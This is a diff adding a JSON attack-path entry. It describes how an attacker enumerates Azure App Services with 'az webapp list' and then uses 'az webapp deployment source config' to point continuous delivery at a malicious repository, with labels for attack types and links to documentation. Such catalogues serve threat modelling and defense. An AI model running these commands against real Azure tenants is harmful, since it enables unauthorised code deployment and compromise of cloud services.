@@ -1,0 +1,36 @@
+{
+    "title": "Exploit Continuous Delivery to Deploy Malicious Code",
+    "icon": "https://img.icons8.com/?size=100&id=ALMv4Xv7TKBA&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List App Services",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/app.png",
+            "details": {
+                "command": "az webapp list --resource-group <ResourceGroupName>",
+                "description": "Lists all app services in the specified resource group.",
+                "services": ["AppService"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp?view=azure-cli-latest#az-webapp-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Set Continuous Delivery",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/delivery.png",
+            "details": {
+                "command": "az webapp deployment source config --name <AppName> --resource-group <ResourceGroupName> --repo-url <MaliciousRepoURL> --branch master --manual-integration",
+                "description": "Configures continuous delivery from a malicious repository.",
+                "services": ["AppService"],
+                "attack_types": ["Code Injection"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/webapp/deployment/source?view=azure-cli-latest#az-webapp-deployment-source-config"
+            }
+        }
+    ]
+}
